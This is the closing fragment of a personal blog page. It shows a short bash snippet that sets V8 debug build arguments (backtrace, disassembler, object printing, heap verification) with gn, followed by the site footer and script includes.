<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gn args out.gn/x64.release</span><br><span class="line"><span class="comment"># 加入</span></span><br><span class="line">v8_enable_backtrace = <span class="literal">true</span></span><br><span class="line">v8_enable_disassembler = <span class="literal">true</span></span><br><span class="line">v8_enable_object_print = <span class="literal">true</span></span><br><span class="line">v8_enable_verify_heap = <span class="literal">true</span></span><br></pre></td></tr></table></figure>




        
  </div>
</article>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2024
    ldrx30
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/ldrx30">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
